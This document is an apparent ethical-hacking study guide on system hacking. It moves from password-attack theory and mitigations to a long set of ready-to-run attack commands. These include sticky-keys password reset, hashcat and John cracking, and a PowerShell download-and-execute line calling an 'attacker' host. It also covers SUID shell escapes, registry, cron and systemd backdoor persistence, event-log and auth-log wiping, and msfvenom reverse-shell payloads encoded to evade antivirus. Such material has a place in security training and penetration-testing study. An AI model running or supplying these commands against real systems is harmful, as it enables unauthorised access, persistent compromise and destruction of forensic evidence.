# Methods for System Hacking

- Cracking Password
- Exploit Services, Application Installed, OS
- Malicious Applications

-------------------------------------------------------------------------------------------------

# Password Cracking - Password Cracking is the method for extracting the password to gain authorized access to the target system like a legitimate user

 Three type of authentication factors:

- Authentication using Username and password
- Authentication using Biometric (Fingerprint, Retina Scan)
- Only Authorized Devices are allowed to connect. This can be done by filtering MAC Address

------------------------------------------------

# Characteristics of Secure password

- In Case sensitive letters
- Special characters
- Numbers
- Lengthy password/Pin (more than 8 character)
- Pass-Phrases

------------------------------------------------

# Types of Password Attacks

 # Non-Electronic Attacks - Don't require any type of technical understanding and knowledge.
  Example:
- Shoulder-Surfing
- Dumpster-Diving
- Eaves-Dropping 
- Vishing   --->

# Active Online Attack - Directly interact with the target for cracking password

- Dictionary/Wordlist Attack - In Dictionary Attack, Attacker Use Preconfigured wordlist (For Username or Password) to gain access into victims account.
- Brute Force Attack - In Brute Force Attack, Attacker Try every possible combination of Characters to gain access to victims account.
- Hash Injection - Hash Injection is performed after gaining access to System. In Hash Injection, Attacker try to crack Hashes available in SAM (Security Account Manager)
  Location : C:\windows\system32\config\SAM) in Windows and Shadow file in Linux OS. ---> /etc/shadows ---> 

# Passive Online Attacks - Passive online attacks are performed without interfering with the target

- Wire Sniffing - In Wire Sniffing, Attacker Sniff network Traffic and try to extract sensitive Information like Telnet, FTP, SMTP credentials.
- Man-in-the-Middle (MITM) Attack - The attacker involves himself into the communication, insert himself in.
   MITM Attacks:
  - xerosploit --> Ettercap --> Bettercap
  - Browser Exploitation Framework (BeEF-XSS) - older version on browser  ---> XSS Protection

# Default Password - Default Password are Set by Developer or Manufacturer. Attacker Try those password to gain Access

- <https://cirt.net/>
- <https://default-password.info/>
- <http://www.passwordsdatabase.com/>

# Password Guessing - The attacker uses the information extracted by initial phases and guess the password

# USB Drive - Attacker plug in an USB Drive that contain a password hacking tool. Windows Autorun feature allows running the application automatically, if enabled

# Password Cracking Techniques for Windows Devices
  - Create a windows/linux Bootalbe pendrive.
  - Access CMD with Shift+F10 in Windows Bootable or Access Terminal in Linux
  - For Windows type below commands:-:
    --> diskpart                                // Access Disk Partition menu
    --> list volume                             // List Partitions and Partition letter for Connected Storage Drives
    --> exit                                    // Exit Diskpart. Not CMD
    --> C:                                      // Access Local Drive C:
    --> dir                                     // List all files and folder in "local drive C:" if Windows,Program Files Folder are there in Local drive C: its good otherwise try local drive D: or E: or F: .................
    --> cd Windows                              // Browse for Windows Folder
    --> cd System32                             // Browse for System32 Folder
    --> ren osk.exe osk1.exe                    // Rename osk.exe to osk1.exe
    --> copy cmd.exe to osk.exe                 // Create a copy of CMD.EXE with a name OSK.EXE
    /////    Exit     /////      Reboot      /////    Access On Screen Keyboard through Accessibility Shortcuts
    --> net user                                // Display Users Available on System
    --> net user Babu_Bhai *                    // Change Password for user "Babu_Bhai". Here astric (*) is used to change password
    --> net user Abcd /add                      // Create a user with the naem Abcd

# Password Cracking Mitigation
- Change default password.
- Do not store/save passwords in applications.
- Do not use guessable passwords.
- Store passwords in form of salted hash.
- Change passwords on weekly/Monthly basis.
- Different password for each service.
- Configure policies for incorrect password attempts. ---> 

-------------------------------------------------------------------------------------------------

# Escalating Privileges - Privilege Escalation is the process of gaining Privileges of Other user.      -->

 - Horizontal Privileges Escalation - The attacker attempts to gain access to user with same set of privileges.

 - Vertical Privileges Escalation - The attacker try to gain access to user with higher set of Privileges.

-------------------------------------------------------------------------------------------------

# Keyloggers

 - Keylogger are malicious software that capture your keystrokes.

# Anti-Keyloggers

 - Anti-Keylogger is an application which ensures protection against keylogging by providing SSl protection, keylogging protection, clipboard logging protection and screen logging protection.

# Key-logging Countermeasures

- Don't click on doubtful URLs
- On-Screen keyboard for secrets
- Physical monitoring
- Host-based IDS
- File scanning prior to installation

# Adware - Adware is a malicious software that show Advertisements to victim by inspecting his actions and interests

# Spyware - Spyware are malicious software that capture your keystrokes, screen, camera, Mic, Location, etc

 Features:

- Tracking users (i.e. keylogging)
- Voice recording
- Video recording

-------------------------------------------------------------------------------------------------

# File Systems

 - New Technology File System (NTFS) Data Stream, is a Windows file system by Microsoft. NTFS is the default file system for Windows 10,- 7,- Vista,- XP,- 2000,- NT.

- File Allocation Table (FAT) file system, is a simple file system originally designed for small disks and simple folder structures.

- Extended File System (Ext) file System, is the first file system created specifically for the Linux kernel

-------------------------------------------------------------------------------------------------

# Steganography - Steganography is a technique for hiding sensitive information in an ordinary message to ensure confidentiality. Steganography uses encryption to maintain the confidentiality. It hides the encrypted data to avoid detection. An attacker may use this to technique to transfer data without being detected
 Examples of Steganography:
  - Image/Pixel Steganography - In Image Steganography, hidden information can be kept in different formats of Image such as PNG, JPG, BMP, etc.
  - Video Steganography - Hiding information in Video files or format.
  - Audio Steganography - Hiding information in Audio files or format.

-------------------------------------------------------------------------------------------------

# Covering tracks - After gaining access, escalating privileges, executing applications, the next step is to wipe digital footprint that perdict attacker identity. In this phase, attacker removes all the event logs, error messages and other evidence to prevent its attack from being discovered easily

 Common techniques:

- Disable auditing
   Preventing another security mechanism to indicate an alert of any sort of intrusion, and leaving to track leaving to track on the machine. The best practice for leaving no track and prevent detection is by disabling the auditing as you logged in on the system. It will not only prevent to log events, but also resist in the detection. Auditing in a system is enabled to detect and track events.
- Clearing logs - By clearing logs, all events logged during the compromise will be erased.

# Disable auditing policies :-

- List auditing categories in windows:
 **-> C:\Windows\system32>auditpol /list /category "**

- Check all category audit policies:
 **-> C:\Windows\system32>auditpol /get /category:*  "**

- Command to enable auditing for System and Account logon: -
 **-> C:\Windows\system32>auditpol /set /category:"System","Account logon" /success:enable /failure:enable  "**

- Command to enable auditing for all categories:
 **-> C:\Windwos\system32>auditpol /set /category:* /success:enable  "**

- Clear Audit Policies
 **-> C:\Windows\system32>auditpol /clear /y "**

# Clearing logs -
   Folder of log files:
  Windows 2000/Server2003/Windows XP: %SystemRoot%\System32\Config
  Server 2008/Vista and up: %SystemRoot%\system32\winevt\logs
  Linux, OpenBSD: /var/log/

# Advanced System Hacking Techniques and Payloads

## Password Cracking Advanced Techniques

### Hash Cracking with Hashcat
```bash
# Hash Identification
hashid hash.txt                                          # Identify hash types
hash-identifier                                          # Interactive hash identification

# Hashcat Password Cracking
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt  # NTLM hash cracking
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt     # MD5 hash cracking
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt  # SHA-512 hash cracking

# Hashcat with Rules
hashcat -m 1000 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hashes.txt wordlist.txt -a 3 ?u?l?l?l?l?l?d?d  # Mask attack

# Custom Wordlist Generation
crunch 8 12 -t Password@@@ -o custom_wordlist.txt        # Custom wordlist with pattern
cewl http://target.com -w wordlist.txt                   # Website-based wordlist
```

**Documentation**: Advanced password cracking using GPU acceleration and sophisticated attack modes.
**Limitations**: Requires powerful hardware for optimal performance; time-intensive for complex passwords.

### John the Ripper Advanced Usage
```bash
# Password Hash Extraction
unshadow /etc/passwd /etc/shadow > combined.txt          # Linux password preparation
samdump2 system sam > hashes.txt                         # Windows SAM dump

# John the Ripper Cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt  # Dictionary attack
john --rules hashes.txt                                  # Rules-based attack
john --incremental hashes.txt                            # Incremental/brute force

# John with Custom Rules
john --wordlist=wordlist.txt --rules=All hashes.txt      # All rules
john --external=Filter_Alpha hashes.txt                  # External filters
```

**Documentation**: CPU-based password cracking with extensive rule sets and customization options.
**Limitations**: Slower than GPU-based tools; limited to specific hash formats.

## Windows Privilege Escalation

### Local Privilege Escalation Techniques
```bash
# System Information Gathering
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"     # OS version check
wmic qfe list                                            # Installed patches
whoami /priv                                             # Current privileges
net users                                                # List all users
net localgroup administrators                            # List administrators

# Automated Privilege Escalation Tools
# PowerUp.ps1 (PowerShell)
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerUp.ps1'); Invoke-AllChecks"

# winPEAS (Windows Privilege Escalation Awesome Scripts)
winpeas.exe                                              # Automated enumeration
winpeas.bat                                              # Batch version

# Windows Exploit Suggester
windows-exploit-suggester.py --update                    # Update database
windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo systeminfo.txt
```

**Documentation**: Automated identification of privilege escalation vectors in Windows environments.
**Limitations**: May trigger antivirus detection; some exploits may not work on patched systems.

### Service Exploitation
```bash
# Service Permission Analysis
sc qc "service_name"                                     # Service configuration
accesschk.exe -uwcqv "Authenticated Users" *            # Service permissions
accesschk.exe -kwsu "Authenticated Users"               # Registry permissions

# Unquoted Service Path Exploitation
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Service Binary Replacement
sc stop vulnerable_service                               # Stop service
copy malicious.exe "C:\Program Files\Service\service.exe"  # Replace binary
sc start vulnerable_service                              # Start service
```

**Documentation**: Exploits Windows service misconfigurations for privilege escalation.
**Limitations**: Requires write access to service directories; may be detected by EDR solutions.

## Linux Privilege Escalation

### Linux Enumeration and Exploitation
```bash
# System Enumeration
id                                                       # Current user and groups
sudo -l                                                  # Sudo permissions
cat /etc/passwd | cut -d: -f1                          # List users
ps aux | grep root                                      # Root processes
find / -perm -4000 2>/dev/null                         # SUID binaries

# Automated Linux Enumeration
# LinPEAS (Linux Privilege Escalation Awesome Script)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t        # Comprehensive enumeration

# Linux Exploit Suggester
linux-exploit-suggester-2.pl                           # Kernel exploit suggestions
```

**Documentation**: Comprehensive Linux privilege escalation enumeration and exploitation.
**Limitations**: May require compilation of exploits; kernel exploits can cause system instability.

### SUID Binary Exploitation
```bash
# Common SUID Exploitation Techniques
# GTFOBins reference: https://gtfobins.github.io/

# Example SUID exploits
find / -user root -perm -4000 -print 2>/dev/null        # Find SUID binaries

# Nano SUID exploitation
nano /etc/passwd                                         # Edit passwd file if nano has SUID

# Vi/Vim SUID exploitation
vi -c ':!/bin/sh' /dev/null                             # Escape to shell from vi

# Less SUID exploitation  
less /etc/passwd
!/bin/sh                                                # Execute shell from less
```

**Documentation**: Exploits SUID binaries for privilege escalation using legitimate system tools.
**Limitations**: Depends on specific SUID configurations; modern systems have fewer vulnerable SUID binaries.

## Memory Exploitation Techniques

### Buffer Overflow Exploitation
```c
// Simple buffer overflow example
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[100];
    strcpy(buffer, input);  // Vulnerable strcpy
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if(argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

```bash
# Buffer overflow exploitation tools
gdb ./vulnerable_program                                 # GDB debugging
pattern_create.rb -l 150                                # Metasploit pattern creation
pattern_offset.rb -q 0x41414141                        # Find offset
msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker LPORT=4444 -f c  # Shellcode generation
```

**Documentation**: Basic buffer overflow exploitation demonstrating memory corruption vulnerabilities.
**Limitations**: Modern systems have protections (ASLR, DEP, Stack Canaries); requires specific vulnerable code.

### Return-Oriented Programming (ROP)
```bash
# ROP Gadget Discovery
ROPgadget --binary vulnerable_binary                    # Find ROP gadgets
ropper -f vulnerable_binary                             # Alternative ROP tool

# ROP Chain Construction
python ropchain_generator.py                            # Custom ROP chain script
```

**Documentation**: Advanced exploitation technique bypassing modern memory protections.
**Limitations**: Requires extensive knowledge of target binary; very complex to implement reliably.

## Persistence Mechanisms

### Windows Persistence Techniques
```bash
# Registry-based Persistence
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\backdoor.exe"

# Scheduled Task Persistence
schtasks /create /tn "WindowsUpdate" /tr "C:\backdoor.exe" /sc onlogon /ru System

# Service Persistence
sc create backdoor binpath= "C:\backdoor.exe" start= auto
net start backdoor

# WMI Event Subscription
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="backdoor", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
```

**Documentation**: Various techniques for maintaining persistent access to compromised Windows systems.
**Limitations**: May be detected by EDR/AV; requires administrative privileges for some techniques.

### Linux Persistence Techniques
```bash
# Crontab Persistence
(crontab -l 2>/dev/null; echo "* * * * * /tmp/backdoor") | crontab -

# SSH Key Persistence
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3...attacker_public_key" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Bashrc Persistence
echo "/tmp/backdoor &" >> ~/.bashrc

# Systemd Service Persistence
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/backdoor
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor
systemctl start backdoor
```

**Documentation**: Linux persistence mechanisms for maintaining access across reboots and sessions.
**Limitations**: May be detected by system administrators; requires appropriate file permissions.

## Anti-Forensics and Log Evasion

### Windows Log Manipulation
```bash
# Event Log Clearing
wevtutil cl System                                       # Clear System log
wevtutil cl Security                                     # Clear Security log
wevtutil cl Application                                  # Clear Application log

# Selective Log Deletion
wevtutil qe Security /rd:true /f:text | findstr "4624"  # Query specific events
wevtutil el | findstr /i security                       # List security logs

# PowerShell History Clearing
Remove-Item (Get-PSReadlineOption).HistorySavePath      # Clear PowerShell history
```

**Documentation**: Techniques for evading forensic analysis by manipulating Windows event logs.
**Limitations**: Log clearing is often detected; forensic tools may recover deleted logs.

### Linux Log Manipulation
```bash
# Log File Manipulation
> /var/log/auth.log                                     # Clear authentication log
> /var/log/secure                                       # Clear secure log (RHEL/CentOS)
> /var/log/syslog                                       # Clear system log

# History Manipulation
history -c                                              # Clear command history
unset HISTFILE                                          # Disable history logging
export HISTFILESIZE=0                                   # Set history file size to 0

# Utmp/Wtmp Manipulation
> /var/log/wtmp                                         # Clear login records
> /var/log/utmp                                         # Clear current login sessions
```

**Documentation**: Linux log manipulation techniques for hiding malicious activities.
**Limitations**: May be detected by log monitoring systems; forensic analysis may recover evidence.

# Payload Development and Deployment

## Metasploit Payload Generation
```bash
# Basic Payload Generation
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o backdoor.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf -o backdoor
msfvenom -p php/meterpreter_reverse_tcp LHOST=attacker LPORT=4444 -f raw -o backdoor.php

# Encoded Payloads (AV Evasion)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded_backdoor.exe

# Custom Payloads
msfvenom --list payloads | grep meterpreter             # List available payloads
msfvenom --list encoders                                # List available encoders
msfvenom --list formats                                 # List output formats
```

**Documentation**: Automated payload generation for various platforms and scenarios.
**Limitations**: Generated payloads may be detected by modern AV; requires post-exploitation handler setup.

# Reference URLs and Research Papers:
- MITRE ATT&CK Framework: https://attack.mitre.org/
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
- OWASP Testing Guide - Authentication: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/
- Windows Security Research: https://docs.microsoft.com/en-us/windows/security/
- Linux Security Documentation: https://www.kernel.org/doc/html/latest/admin-guide/security-bugs.html
- Research Paper: "Modern Binary Exploitation" - https://github.com/RPISEC/MBE
- Privilege Escalation Guide: https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/
- GTFOBins Project: https://gtfobins.github.io/
